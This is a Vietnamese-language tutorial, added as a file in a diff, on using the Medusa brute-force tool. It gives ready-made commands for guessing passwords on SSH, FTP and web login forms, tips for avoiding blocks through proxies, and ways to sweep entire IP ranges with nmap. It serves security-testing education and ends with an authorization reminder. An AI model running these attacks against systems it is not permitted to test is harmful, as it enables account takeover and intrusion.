@@ -1,0 +1,182 @@
+1. Medusa là gì?
+
+    Medusa là công cụ brute-force đa giao thức, dòng lệnh, cực nhanh và ổn định.
+
+    Hỗ trợ: SSH, FTP, HTTP(S), SMB, RDP, VNC, POP3/IMAP/SMTP, MySQL, MSSQL, PostgreSQL, Telnet, CVS, SVN, rlogin, v.v.
+
+    Đa luồng mạnh mẽ, scan nhiều host/user/pass cùng lúc, cấu hình output tốt.
+
+2. Cài đặt Medusa
+A. Trên Kali/Ubuntu/Debian
+
+sudo apt update
+sudo apt install medusa
+
+B. Build từ source (hiếm dùng)
+
+git clone https://github.com/jmk-foofus/medusa.git
+cd medusa
+./configure
+make
+sudo make install
+
+C. Kiểm tra
+
+medusa -h
+
+3. Sử dụng Medusa cơ bản
+A. Brute-force SSH
+
+medusa -h 192.168.1.10 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
+
+    -h: host/IP
+
+    -u: user cố định
+
+    -P: file passlist
+
+    -M: module protocol (ssh, ftp, smb...)
+
+B. Brute-force FTP
+
+medusa -h 192.168.1.20 -U users.txt -P pass.txt -M ftp
+
+    -U: file user
+
+    -P: file pass
+
+C. Brute-force HTTP Basic Auth
+
+medusa -h site.com -u admin -P pass.txt -M http
+
+4. Các tuỳ chọn quan trọng của Medusa
+Tham số	Ý nghĩa
+-h <host>	1 host
+-H <file>	File chứa nhiều host (mỗi dòng 1 IP/host)
+-u <user>	1 user
+-U <file>	File user
+-p <pass>	1 pass
+-P <file>	File pass
+-M <module>	Protocol (ssh, ftp, http, smb, rdp...)
+-n <port>	Port tuỳ chỉnh
+-t <num>	Số thread song song (default 16)
+-O <file>	Output ra file
+-F	Dừng khi có thành công
+-L	Chỉ log thành công
+-e ns	Thử null, user==pass
+-m <opt>	Tham số module riêng (ví dụ -m DIR:/secret cho HTTP)
+
+Ví dụ:
+
+medusa -H hostlist.txt -U user.txt -P pass.txt -M ssh -t 32 -O result.txt
+
+5. Brute-force HTTP Form/Web Login
+A. Xác định form, param và response thất bại
+
+    Dùng Burp Suite/ZAP để lấy POST, param, status, response fail.
+
+B. Lệnh mẫu
+
+medusa -h site.com -U user.txt -P pass.txt -M http -m DIR:/login.php,POSTDATA:"user=^USER^&pass=^PASS^",ERROR:"Invalid"
+
+    DIR: endpoint
+
+    POSTDATA: param, ^USER^ và ^PASS^ được thay thế tự động
+
+    ERROR: từ khóa nhận biết login fail
+
+6. Brute-force nhiều host/user/pass
+
+    Nhiều host:
+
+medusa -H hosts.txt -U users.txt -P pass.txt -M ssh
+
+Nhiều user trên 1 host:
+
+    medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ftp
+
+7. Tối ưu tốc độ và tránh block
+
+    Tăng thread:
+
+medusa ... -t 32
+
+Delay mỗi attempt:
+
+medusa ... -T 2
+
+Dùng proxy (qua torsocks hoặc proxychains):
+
+proxychains medusa ...
+
+Chỉ log thành công (clean output):
+
+    medusa ... -L
+
+8. Bypass filter, auth, brute nâng cao
+
+    Test user=null, user==pass:
+
+medusa ... -e ns
+
+Brute multi-step form (captcha, OTP):
+
+    Medusa không tự bypass được, cần kết hợp script ngoài (hoặc hydra/tấn công social).
+
+HTTP Header, Cookie:
+
+    medusa -h site.com -u admin -P pass.txt -M http -m DIR:/login.php,POSTDATA:"user=^USER^&pass=^PASS^",COOKIE:"PHPSESSID=abc123"
+
+    Brute nhiều module cùng lúc:
+
+        Không trực tiếp (1 lần chỉ 1 service), nhưng có thể loop script qua module.
+
+9. Automation – batch scan thực chiến
+
+    Scan toàn dải IP, multi-user, multi-pass:
+
+medusa -H 10.10.10.0-255 -U users.txt -P pass.txt -M ssh -t 32 -O allssh.txt
+
+Gộp với Nmap quét host sống:
+
+    nmap -p 22 --open 10.10.10.0/24 -oG sshup.txt
+    awk '/22\/open/ {print $2}' sshup.txt > host.txt
+    medusa -H host.txt -U users.txt -P pass.txt -M ssh
+
+10. Phân tích kết quả
+
+    Output có dạng:
+
+    ACCOUNT FOUND: [ssh] Host: 192.168.1.10   User: admin   Password: 123456
+
+    Log vào file với -O, hoặc chỉ hiện thành công với -L
+
+11. Một số lỗi & mẹo fix nhanh
+Lỗi	Fix
+Bị block, timeout	Giảm thread, tăng delay, đổi proxy
+Lệnh không chạy	Kiểm tra syntax, module hỗ trợ (medusa -d)
+Không thấy success	Kiểm tra param, response fail, thử pass null/user=pass
+Quét chậm	Tăng thread, chia nhỏ wordlist, check mạng
+Dịch vụ không hỗ trợ	Xem module với medusa -d, hoặc dùng hydra
+12. Tài liệu, link hữu ích
+
+    Medusa Official
+
+    PayloadAllTheThings Credential Brute-Force
+
+    SecLists user/pass list
+
+    medusa -h
+
+    man medusa
+
+Tóm tắt nhanh
+
+    Medusa: brute-force cực nhanh, đa giao thức, thích hợp quét diện rộng, automation tốt.
+
+    Hỗ trợ nhiều thread, wordlist lớn, output log rõ ràng.
+
+    Phối hợp với hydra/ ncrack/ crackmapexec để tối ưu kiểm thử bảo mật nội bộ, CTF, bug bounty.
+
+    Luôn tôn trọng chính sách – không brute vào dịch vụ production thật khi chưa xin phép!
+
